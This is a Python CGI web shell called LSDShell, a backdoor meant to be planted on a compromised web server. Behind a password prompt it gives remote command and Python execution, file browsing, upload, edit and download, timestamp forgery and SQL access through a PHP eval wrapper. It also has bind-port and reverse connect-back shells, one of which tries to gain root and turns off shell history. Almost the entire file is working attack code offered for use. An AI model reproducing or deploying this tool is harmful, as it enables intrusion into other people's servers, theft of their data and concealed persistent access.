#!/usr/bin/env python
import sys, os, cgi, commands, time, Cookie, socket, pty,select
from base64 import b64encode
from stat import *
from datetime import datetime
sys.stderr = open(os.devnull, 'w')
password = ""
version = "0.666"
esc = '%s['%chr(27)
color = esc + "1;36m"
reset = esc + "0m"
# don't ask why i did it this way, ''' doesnt agree with pty's
ascii = color################################################################################
ascii +='  @@@@@@@ @@@  @@@ @@@ @@@@@@@  @@@@@@@  @@@ @@@  @@@ @@@@@@  @@@@@@  @@@@@@@ \r\n'#
ascii +=' !@@      @@!  @@@ @@! @@!  @@@ @@!  @@@ @@! !@@  @@@     @@!     @@!      @@!\r\n'#
ascii +=' !@!      @!@!@!@! !!@ @!@@!@!  @!@@!@!   !@!@!   !@!  @!!!:   @!!!:      @!! \r\n'#
ascii +=' :!!      !!:  !!! !!: !!:      !!:        !!:    !!!     !!:     !!:  .!!:   \r\n'#
ascii +='  :: :: :  :   : : :    :        :         .:     :   ::: ::  ::: ::  : :     \r\n'#
ascii +='             ~[  P R I V 8  C O N N E C T   B A C K   S H E L L  ]~           \r\n'#
ascii += reset###############################################################################       

def getall(theform, nolist = False):
    data = {}
    for field in theform.keys():
        if type(theform[field]) ==  type([]):
            if not nolist:
                data[field] = theform.getlist(field)
            else:
                data[field] = theform.getfirst(field)
        elif theform[field].filename:
            _FILES[field] = theform[field]
        else:
            data[field] = theform[field].value
    return data

def escape(str):
    return str.replace("'", "\\'").replace("\r", "\\r").replace("\n", "\\n")

_FILES = {}
_REQUEST = getall( cgi.FieldStorage() )
if _REQUEST.has_key('charset') == False:
    _REQUEST['charset'] = "Windows-1251"
if _REQUEST.has_key('a') == False:
    _REQUEST['a'] = "files"
if _REQUEST.has_key('c') == False:
    _REQUEST['c'] = os.getcwd()
if _REQUEST.has_key('p1') == False:
    _REQUEST['p1'] = ""
if _REQUEST.has_key('p2') == False:
    _REQUEST['p2'] = ""
if _REQUEST.has_key('p3') == False:
    _REQUEST['p3'] = ""

_COOKIE = Cookie.SimpleCookie()
try:
    _COOKIE.load(os.environ["HTTP_COOKIE"])
except:
    pass

def printLogin():
    _COOKIE['psswd'] = "";
    print _COOKIE;
    print "Content-type: text/html\n";
    print """<center><form method=post>Password: <input type=password name=psswd><input type=submit value='&gt;&gt;'></form></center>"""
    exit()

if _COOKIE.has_key('psswd') and len(_COOKIE['psswd'].value) > 0 :
    if _COOKIE['psswd'].value != password:
        printLogin()
elif _REQUEST.has_key('psswd'):
        try:
            import hashlib
            psswd = hashlib.md5()
        except:
            import md5
            psswd = md5.new()
        psswd.update(_REQUEST['psswd'])
        if psswd.hexdigest() != password:
            printLogin()
        else:
            _COOKIE['psswd'] = psswd.hexdigest()
else:
    printLogin()

print _COOKIE
home_dir = os.getcwd()

try:
    os.chdir(_REQUEST['c'])
except os.error, msg:
    pass

cwd = os.getcwd();
if cwd[-1] != '/':
    cwd += '/'

def printHeader():
    print "Content-type: text/html\n";
    print "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" + _REQUEST['charset'] + "'><title>" + os.environ["SERVER_NAME"] + " - LSDShell " + version + """</title>
    <style>
        body{background-color:#444;color:#e1e1e1;}
        body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }
        table.info{ color:#fff;background-color:#222; }
        span,h1,a{ color:#00cfcf !important; }
        span{ font-weight: bolder; }
        h1{ border-left:5px solid #df5;padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px; }
        div.content{ padding: 5px;margin-left:5px;background-color:#333; }
        a{ text-decoration:none; }
        a:hover{ text-decoration:underline; }
        .ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
        .bigarea{ width:100%;height:250px; }
        input,textarea,select{ margin:0;color:#00afaf;background-color:#555;border:1px solid #00afcf; font: 9pt Monospace,"Courier New"; }
        form{ margin:0px; }
        #toolsTbl{ text-align:center; }
        .toolsInp{ width: 300px }
        .main th{text-align:left;background-color:#5e5e5e;}
        .main tr:hover{background-color:#5e5e5e}
        .l1{background-color:#444}
        pre,.m{font-family:Courier,Monospace;}
    </style>
    <script>
        var c_ = '""" + escape(_REQUEST['c']) + """';
        var a_ = '""" + escape(_REQUEST['a']) + """';
        var p1_ = '""" + escape(_REQUEST['p1']) + """';
        var p2_ = '""" + escape(_REQUEST['p2']) + """';
        var p3_ = '""" + escape(_REQUEST['p3']) + """';
        var charset_ = '""" + escape( _REQUEST['charset'] ) + """';
        function g(a,c,p1,p2,p3,charset) {
            if(a != null)document.mf.a.value=a;else document.mf.a.value=a_;
            if(c != null)document.mf.c.value=c;else document.mf.c.value=c_;
            if(p1 != null)document.mf.p1.value=p1;else document.mf.p1.value=p1_;
            if(p2 != null)document.mf.p2.value=p2;else document.mf.p2.value=p2_;
            if(p3 != null)document.mf.p3.value=p3;else document.mf.p3.value=p3_;
            if(charset != null)document.mf.charset.value=charset;else document.mf.charset.value=charset_;
            document.mf.submit();
        }
    </script>
    <head><body><div style="position:absolute;width:100%;background-color:#444;top:0;left:0;">
    <form method=post name=mf style='display:none;'>
    <input type=hidden name=a>
    <input type=hidden name=c>
    <input type=hidden name=p1>
    <input type=hidden name=p2>
    <input type=hidden name=p3>
    <input type=hidden name=charset>
    </form>"""
    print '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Time:<br>Cwd:</span></td>'
    print '<td><nobr>'
    for x in os.uname():
        sys.stdout.write(x+' ')
    t = time.localtime()
    print '</nobr><br>%s<br>%d-%.2d-%.2d %.2d:%.2d:%.2d <span>Server IP:</span> %s <span>Client IP:</span> %s<br>' %( commands.getoutput( 'id' ), t[0], t[1], t[2], t[3], t[4], t[5], os.environ['SERVER_ADDR'], os.environ['REMOTE_ADDR'])
    path = ''
    paths = cwd.split('/')
    paths.pop()
    for x in paths:
        path += x + '/'
        sys.stdout.write("""<a href="#" onclick="g('files','"""+escape(path)+"""', '', '', '')">"""+x+"""/</a>""")
    print " " + permsColor(cwd),"""<a href='#' onclick="g('files','"""+ escape( home_dir ) +"""', '', '', '')">[ home ]</a>"""
    charsets = ['UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866']
    print '<td width=1 align=right><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">'
    for charset in charsets:
        sys.stdout.write('<option value="%s" ' % charset)
        if _REQUEST['charset'] == charset:
             sys.stdout.write('selected')
        sys.stdout.write('>%s</option>' % charset)
    print '</optgroup></select><br><small>Currently logged in: '+commands.getoutput('users')+'</small></td></tr></table><table style="border-top:2px solid #00afcf;text-align: center;" cellpadding=3 cellspacing=0 width=100%><tr>'
    for x in ['Files', 'Console', 'Python', 'Network', 'SQL']:
        print "<td width='100px'>[ <a href='#' onclick='g(\""+x.lower()+'", null, "", "", "")\'>'+x+'</a> ]</td>'
    print '<td></td></tr></table><div style="margin:5">'

def printFooter():
    if os.access (cwd, os.W_OK):
        writable = "<b><font color=#00cfdf>[ Writeable ]</font>"
    else:
        writable = "<font color=red>[ Not writable ]</font>"
    print """</div>
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style="border-top:2px solid #333;border-bottom:2px solid #333;">
	<tr>
		<td><form onsubmit="g(null,this.c.value);return false;"><span>Change dir:</span><br><input class="toolsInp" type=text name=c value='""" + cwd + """'><input type=submit value="&gt;&gt;"></form></td>
		<td><form onsubmit="g('fileTools',null,this.f.value);return false;"><span>Read file:</span><br><input class="toolsInp" type=text name=f><input type=submit value="&gt;&gt;"></form></td>
	</tr>
	<tr>
		<td><form onsubmit="g('files',null,'mkdir',this.d.value);return false;"><span>Make dir:</span><br><input class="toolsInp" type=text name=d><input type=submit value="&gt;&gt;"></form>"""+writable+"""</td>
		<td><form onsubmit="g('fileTools',null,this.f.value,'save','');return false;"><span>Make file:</span><br><input class="toolsInp" type=text name=f><input type=submit value="&gt;&gt;"></form>"""+writable+"""</td>
	</tr>
	<tr>
		<td><form onsubmit="g('console',null,this.c.value);return false;"><span>Execute:</span><br><input class="toolsInp" type=text name=c value=""><input type=submit value="&gt;&gt;"></form></td>
		<td><form method='post' ENCTYPE='multipart/form-data'>
		<input type=hidden name=a value='files'>
		<input type=hidden name=c value='"""+cwd+"""'>
		<input type=hidden name=p1 value='uploadFile'>
		<input type=hidden name=charset value='"""+_REQUEST['charset']+"""'>
		<span>Upload file:</span><br><input class="toolsInp" type=file name=f><input type=submit value="&gt;&gt;"></form>"""+writable+"""</td>
	</tr>

</table>
</div>
</body></html>"""

def viewSize(s):
    if s >= 1073741824:
		return "%1.2f  GB" % (s / 1073741824.0);
    elif s >= 1048576:
		return "%1.2f  MB" % (s / 1048576.0);
    elif s >= 1024:
		return "%1.2f  KB" % (s / 1024.0);
    else:
		return str(s) + ' B';

def perms(p):
    mode = os.lstat(p)[ST_MODE]
    p = mode
    i="";
    if (p & 0xC000) == 0xC000:
        i = 's'
    elif (p & 0xA000) == 0xA000:
        i = 'l'
    elif (p & 0x8000) == 0x8000:
        i = '-'
    elif (p & 0x6000) == 0x6000:
        i = 'b'
    elif (p & 0x4000) == 0x4000:
        i = 'd'
    elif (p & 0x2000) == 0x2000:
        i = 'c'
    elif (p & 0x1000) == 0x1000:
        i = 'p'
    else:
        i = 'u'
    if p & 0x0100: i += 'r'
    else: i += '-'
    if p & 0x0080: i += 'w'
    else: i += '-'
    if  p & 0x0040:
        if p & 0x0800: i += 's'
        else: i += 'x'
    else:
        if p & 0x0800: i += 'S'
        else: i+='-'
    if p & 0x0020: i += 'r'
    else: i += '-'
    if p & 0x0010: i += 'w'
    else: i += '-'
    if  p & 0x0008:
        if p & 0x0400: i += 's'
        else: i += 'x'
    else:
        if p & 0x0400: i += 'S'
        else: i += '-'
    if p & 0x0004: i += 'r'
    else: i += '-'
    if p & 0x0002: i += 'w'
    else: i += '-'
    if  p & 0x0001:
        if p & 0x0200: i += 't'
        else: i += 'x'
    else:
        if p & 0x0200: i += 'T'
        else: i += '-'

    return i;

def permsColor(path):
    if not os.access (path, os.R_OK):
        return "<font color='#FF0000'>"+perms(path)+"</font>"
    elif os.access (path, os.W_OK):
        return "<font color='#00BB00'>"+perms(path)+"</font>"
    else:
        return "<font color='white'>"+perms(path)+"</font>"

def actionConsole():
    printHeader()
    print "<h1>Console</h1><div class=content>"
    print """<form name="cf" onSubmit="g(null, null, this.cmd.value);return false;" style="border:1px solid #00afcf;background-color:#555;"><textarea class=bigarea style="border:0px;" readonly>"""
    if len(_REQUEST['p1']) > 0:
        print '$', cgi.escape(_REQUEST['p1'])
        print cgi.escape(commands.getoutput(_REQUEST['p1']))

    print '</textarea><table cellpadding=0 cellspacing=0 width="100%"><tr><td width="1%">$</td><td><input type=text name=cmd style="border:0px;width:100%;"></td></tr></table>'
    print "</form></div><script>document.cf.cmd.focus();</script>"
    printFooter()

def actionFiles():
    printHeader()
    if _REQUEST['p1'] == 'uploadFile':
        try:
            if _FILES['f'].filename:
                fn = os.path.basename(_FILES['f'].filename)
                open(fn, 'wb').write(_FILES['f'].file.read())
        except: pass
    if _REQUEST['p1'] == 'mkdir':
        try: os.mkdir(_REQUEST['p2'])
        except: pass
    print "<h1>File manager</h1><div class=content>"
    item_stat = os.lstat('..')

    def dirItemInfo(name, item_stat):
        if S_ISLNK(item_stat[ST_MODE]):
            type = "link"
        else:
            type = "dir"
        tmp = {
                'name'  : name,
                'path'  : os.path.join(cwd, name),
                'size'  : viewSize(item_stat[ST_SIZE]),
                'mtime' : datetime.fromtimestamp(item_stat[ST_MTIME]).strftime("%Y-%m-%d %H:%M:%S"),
                'uid'   : str(item_stat[ST_UID]),
                'gid'   : str(item_stat[ST_GID]),
                'perms' : permsColor(name),
                'type'  : type
              }
        return tmp
    dirs = [dirItemInfo('..', os.lstat('..'))]
    files = []

    for item in os.listdir(cwd):
        item_stat = os.lstat(item)
        mode = item_stat[ST_MODE]
        tmp = dirItemInfo(item, item_stat)
        if S_ISLNK(mode) or S_ISDIR(mode):
            dirs.append(tmp)
        elif S_ISREG(mode):
            files.append(tmp)

    print "<table width='100%' class='main' cellspacing='0' cellpadding='2'><form method='post'>"
    print """<tr><th>Name</th><th>Size</th><th>Modify</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr>""";
    
    def sort(a, b):
        return cmp(a['name'].lower(), b['name'].lower())

    line = 0
    for item in sorted(dirs, sort):
        print "<tr"
        if line:
            print " class=l1"
        print "><td><a href='#' onclick='g(null,\""+escape(item['path'])+"\")'><b>[ "+cgi.escape(item['name'])+" ]</b></a></td><td>"+item['type']+"</td><td>"+item['mtime']+"</td><td>"+item['uid']+"/"+item['gid']+"</td><td><a href=# onclick=\"g('fileTools', null, '"+escape(item['name'])+"', 'chmod')\">"+item['perms']+"</a></td>"
        print "<td><a href=# onclick=\"g('fileTools', null, '"+escape(item['name'])+"', 'rename')\">R</a> <a href=# onclick=\"g('fileTools', null, '"+escape(item['name'])+"', 'touch')\">T</a></td></tr>"
        line = (line + 1)%2
    for item in sorted(files, sort):
        print "<tr"
        if line:
            print " class=l1"
        print "><td><a href='#' onclick='g(\"fileTools\",null,\""+escape(item['name'])+"\")'>"+cgi.escape(item['name'])+"</a></td><td>"+item['size']+"</td><td>"+item['mtime']+"</td><td>"+item['uid']+"/"+item['gid']+"</td><td><a href=# onclick=\"g('fileTools', null, '"+escape(item['path'])+"', 'chmod')\">"+item['perms']+"</a></td>"
        print "<td><a href=# onclick=\"g('fileTools', null, '"+escape(item['name'])+"', 'rename')\">R</a> <a href=# onclick=\"g('fileTools', null, '"+escape(item['name'])+"', 'touch')\">T</a> <a href=# onclick=\"g('fileTools', null, '"+escape(item['name'])+"', 'edit')\">E</a> <a href=# onclick=\"g('fileTools', null, '"+escape(item['name'])+"', 'download')\">D</a></td></tr>"
        line = (line + 1)%2

    print "</form></table></div>"
    printFooter()

def actionFileTools():
    if _REQUEST['p2'] == "":
        _REQUEST['p2'] = "view"
    if _REQUEST['p2'] == "download":
        print "Content-Disposition: attachment; filename=" + os.path.basename(_REQUEST['p1']) + "\n"
        try:
            fp = open(_REQUEST['p1'], 'rb')
            for x in fp.readlines():
                sys.stdout.write(x)
            fp.close()
        except: pass
        return
    if _REQUEST['p2'] == "save":
        try:
            fp = open(_REQUEST['p1'], 'w')
            fp.write(_REQUEST['p3'])
            fp.close()
        except: pass
        _REQUEST['p2'] = 'edit'
    printHeader()
    print "<h1>File tools</h1><div class=content>"
    item_stat = os.stat(_REQUEST['p1'])
    print "<span>File: </span>" + os.path.basename(_REQUEST['p1']) + " <span>Size: </span> " +viewSize(item_stat[ST_SIZE]) + " <span>Permission:</span> " +permsColor(_REQUEST['p1'])
    print "<br/>"
    if S_ISDIR(item_stat[ST_MODE]):
        menu = ['Chmod', 'Rename', 'Touch']
    else:
        menu = ['View', 'Download', 'Edit', 'Chmod', 'Rename', 'Touch']
    for x in menu:
        print "<a href=# onclick=\"g(null, null, null, '"+x.lower()+"')\">"
        if x.lower() == _REQUEST['p2']:
            print "<b>[ " + x + " ]</b>"
        else:
            print x
        print "</a> "
    print "<br><br>";
    if _REQUEST['p2'] == "view":
        try:
            fp = open(_REQUEST['p1'], 'r')
            print "<pre class=ml1>"
            for x in fp.readlines():
                sys.stdout.write(cgi.escape(x))
            fp.close()
            print "</pre>"
        except:
            print "Can't open file! "+_REQUEST['p1']
    if _REQUEST['p2'] == "edit":
        try:
            fp = open(_REQUEST['p1'], 'r')
            print "<form onsubmit=\"g(null,null,'"+escape(_REQUEST['p1'])+"', 'save', this.f.value);return false;\"><textarea name=f class=bigarea>"
            for x in fp.readlines():
                sys.stdout.write(cgi.escape(x))
            fp.close()
            print "</textarea><input type='submit' value='&gt;&gt;'></form>"
        except:
            print "Can't open (create) file! "+_REQUEST['p1']
    if _REQUEST['p2'] == "chmod":
        import stat, string
        if len(_REQUEST['p3']):
            perm = string.atoi(_REQUEST['p3'], 8)
            try:
                os.chmod(_REQUEST['p1'], perm)
                print "Done"
            except: print "Fail!"
        print "<form onsubmit=\"g(null,null,'"+escape(_REQUEST['p1'])+"', 'chmod', this.p.value);return false;\"><input type='text' name='p' value='"
        print "%o" % stat.S_IMODE(os.stat(_REQUEST['p1'])[ST_MODE])
        print "'/><input type='submit' value='&gt;&gt;'></form>"
    if _REQUEST['p2'] == "rename":
        if len(_REQUEST['p3']):
            try:
                os.rename(_REQUEST['p1'], _REQUEST['p3'])
                _REQUEST['p1'] = _REQUEST['p3']
                print "Done<script>p2_='" + escape(_REQUEST['p3']) + "'</script>"
            except: print "Fail!"
        print "<form onsubmit=\"g(null,null,'"+escape(_REQUEST['p1'])+"', 'rename', this.n.value);return false;\"><input type='text' name='n' value='" + escape(_REQUEST['p1'])+ "'/><input type='submit' value='&gt;&gt;'></form>"

    if _REQUEST['p2'] == "touch":
        if len(_REQUEST['p3']):
            try:
                tmstmp = time.mktime(time.strptime(_REQUEST['p3'], "%Y-%m-%d %H:%M:%S"))
                os.utime(_REQUEST['p1'], (tmstmp, tmstmp))
                item_stat = os.stat(_REQUEST['p1'])
                print "Done"
            except: print "Fail!"
        print "<form onsubmit=\"g(null,null,'"+escape(_REQUEST['p1'])+"', 'touch', this.n.value);return false;\"><input type='text' name='n' value='"
        print datetime.fromtimestamp(item_stat[ST_MTIME]).strftime("%Y-%m-%d %H:%M:%S")
        print "'/><input type='submit' value='&gt;&gt;'></form>"

    print "</div>"
    printFooter()

def actionPython():
    printHeader()
    print "<h1>Exec python code</h1><div class=content>"
    print """<form name="cf" onSubmit="g(null, null, this.c.value);return false;"><textarea class=bigarea name=c>"""
    print '</textarea><input type=submit value="&gt;&gt;">'
    if len(_REQUEST['p1']) > 0:
        print '<pre class="ml1" style="margin-top:5px;">'
        try:
            import StringIO
            old_stdout = sys.stdout
            sys.stdout = StringIO.StringIO()
            exec(_REQUEST['p1'])
            data = sys.stdout.getvalue()
            sys.stdout = old_stdout
            print cgi.escape(data)
        except:
            pass
        print '</pre>'
    print "</form></div>"
    printFooter()

def actionSQL():
    printHeader()
    thephp = '''
$user = "LOLUSERFUCK";
$password = "LOLPASSFUCK";
$host = "localhost";
$db = "LOLDBFUCK";
mysql_connect($host,$user,$password);
$query = "LOLQUERYFUCK";
mysql_select_db($db);
$result = mysql_query($query);

while($row = mysql_fetch_array($result, MYSQL_NUM)) {
        for($i = 0;$i<count($row);$i++) {
                echo $row[$i].'<br>';
        }
}
'''
    if _REQUEST.has_key('db'):
        print """<h1>SQL</h1><div class=content>
    <form name='nfp' method='post'>
	<span>Run SQL</span><br/> <input type='hidden' name='a' value='sql'>
	Database: <input type='text' name='db' value='"""+_REQUEST['db']+"""'> User: <input type='text' name='user' value='"""+_REQUEST['user']+"""'> Pass: <input type='text' name='pass' value='"""+_REQUEST['pass']+"""'> Query: <input type='text' name='query' value='"""+_REQUEST['query']+"""'><input type=submit value=">>">
	</form><br></div>"""
    else:
        print """<h1>SQL</h1><div class=content>
    <form name='nfp' method='post'>
	<span>Run SQL</span><br/> <input type='hidden' name='a' value='sql'>
	Database: <input type='text' name='db' value='mysql'> User: <input type='text' name='user' value='root'> Pass: <input type='text' name='pass' value='dongs'> Query: <input type='text' name='query' value='show databases'><input type=submit value=">>">
	</form><br></div>"""
    if _REQUEST.has_key('db'):
        thephp = thephp.replace("LOLUSERFUCK", _REQUEST['user']).replace("LOLPASSFUCK", _REQUEST['pass']).replace("LOLQUERYFUCK", _REQUEST['query']).replace("LOLDBFUCK", _REQUEST['db'])
        thephp = b64encode(thephp) # cause fuck escaping shit
        thephp = '\"%s\"' % thephp
        print commands.getoutput("echo '<?php eval(base64_decode("+thephp+")); ?>' | php").replace("\n","<br>")
    printFooter()

def actionNetwork():
    printHeader()
    if _REQUEST['p1'] != "":
        sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
    if _REQUEST['p1'] == "bp":
        try:
            sock.bind(('localhost', int(_REQUEST['p2'])))
            sock.listen(0)
        except:
            print "error"
        else:
            print "done"
        if os.fork()!=0:
            (c,addr)=sock.accept()
            os.dup2(c.fileno(), 0)
            os.dup2(c.fileno(), 1)
            os.dup2(c.fileno(), 2)
            os.system('/bin/sh -i')
            c.shutdown(2)
            sock.shutdown(2)
    elif _REQUEST['p1'] == "bc":
        try:
            sock.connect( (_REQUEST['p2'], int(_REQUEST['p3'])) )
        except:
            print "error"
        else:
            print "done"
            if os.fork()!=0:
                os.dup2(sock.fileno(), 0)
                os.dup2(sock.fileno(), 1)
                os.dup2(sock.fileno(), 2)
                os.system('/bin/bash -i')
                sock.shutdown(2)
    elif _REQUEST['p1'] == "cc":
        try:
            sock.connect( (_REQUEST['p2'], int(_REQUEST['p3'])) )
        except:
            print "error"
        else:
            print "done"
            try: os.setreuid(0,0)
            except: pass
            uname = commands.getoutput("uname -a")
            id = commands.getoutput("id")
            pid, childProcess = pty.fork() 
            if pid == 0:
                sock.send(ascii)
                sock.send(uname+"\r\n"+id+"\r\n")
                os.putenv("HISTFILE","/dev/null")
                os.putenv("HOME",os.getcwd())
                os.putenv("PATH",'/usr/local/sbin:/usr/sbin:/sbin:'+os.getenv('PATH'))
                os.putenv("TERM",'linux')
                os.putenv("PS1",color+'''\u@\h:\w\$ '''+reset)
                pty.spawn("/bin/bash")
                sock.send("\r\n")
                sock.shutdown(1)
            else:
                b = sock.makefile(os.O_RDONLY|os.O_NONBLOCK) 
                c = os.fdopen(childProcess,'r+') 
                y = {b:c,c:b}
                try:
                    while True:
                        for n in select.select([b,c],[],[])[0]: 
                            z = os.read(n.fileno(),4096)
                            y[n].write(z) 
                            y[n].flush() 
                except: pass
                
    print """<h1>Network tools</h1><div class=content>
    <form name='nfp' onSubmit="g(null,null,'bp',this.port.value);return false;">
	<span>Bind port to /bin/sh</span><br/>
	Port: <input type='text' name='port' value='2048'><input type=submit value=">>">
	</form>
<form name='nfp' onSubmit="g(null,null,'bc',this.server.value,this.port.value);return false;">
	<span>Back-connect shell: </span><br/>
	Server: <input type='text' name='server' value='"""+os.environ['REMOTE_ADDR']+"""'> Port: <input type='text' name='port' value='443'><input type=submit value=">>">
	</form>
	<form name='nfp' onSubmit="g(null,null,'cc',this.server.value,this.port.value);return false;">
	<span>Chippy1337 enhanced back-connect shell (requires socat): </span><br/>
	Server: <input type='text' name='server' value='"""+os.environ['REMOTE_ADDR']+"""'> Port: <input type='text' name='port' value='443'><input type=submit value=">>">
	</form><br></div>"""
    printFooter()
print password
try:
    {
        'files' : actionFiles,
        'fileTools' : actionFileTools,
        'console' : actionConsole,
        'python' : actionPython,
        'network' : actionNetwork,
        'sql' : actionSQL
    }[_REQUEST['a']]()
except KeyError:
    printHeader()
    printFooter()

